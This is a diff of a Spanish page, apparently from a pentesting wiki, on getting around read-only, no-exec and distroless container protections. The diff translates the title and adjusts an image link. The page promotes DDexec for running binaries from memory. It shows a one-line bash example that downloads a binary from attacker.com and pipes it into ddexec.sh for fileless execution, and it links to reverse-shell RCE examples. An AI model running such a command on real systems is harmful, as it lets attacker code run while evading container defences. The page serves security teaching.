@@ -1,4 +1,4 @@
-# Saltar las protecciones del sistema de archivos: solo lectura / sin ejecución / Distroless
+# Bypass FS protections: read-only / no-exec / Distroless
 
 <details>
 
@@ -81,10 +81,12 @@ Por lo tanto, **controlando el código de ensamblaje** que está siendo ejecutad
 {% hint style="success" %}
 **DDexec / EverythingExec** te permitirá cargar y **ejecutar** tu propio **código de shell** o **cualquier binario** desde la **memoria**.
 {% endhint %}
+
 ```bash
 # Basic example
 wget -O- https://attacker.com/binary.elf | base64 -w0 | bash ddexec.sh argv0 foo bar
 ```
+
 Para obtener más información sobre esta técnica, consulta el Github o:
 
 {% content-ref url="ddexec.md" %}
@@ -131,7 +133,7 @@ Sin embargo, en este tipo de contenedores estas protecciones generalmente existi
 
 Puedes encontrar **ejemplos** de cómo **explotar algunas vulnerabilidades de RCE** para obtener **shells inversos de lenguajes de script** y ejecutar binarios desde la memoria en [**https://github.com/carlospolop/DistrolessRCE**](https://github.com/carlospolop/DistrolessRCE).
 
-<figure><img src="../../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="https://github.com/carlospolop/hacktricks/blob/es/.gitbook/assets/image%20(1)%20(1)%20(1)%20(1)%20(1)%20(1)%20(1)%20(1)%20(1)%20(1)%20(1)%20(1)%20(1)%20(1)%20(1)%20(1)%20(1)%20(1)%20(1)%20(1)%20(1)%20(1)%20(1).png" alt=""><figcaption></figcaption></figure>
 
 Si estás interesado en una **carrera de hacking** y hackear lo imposible - **¡estamos contratando!** (_se requiere dominio del polaco escrito y hablado_).
 
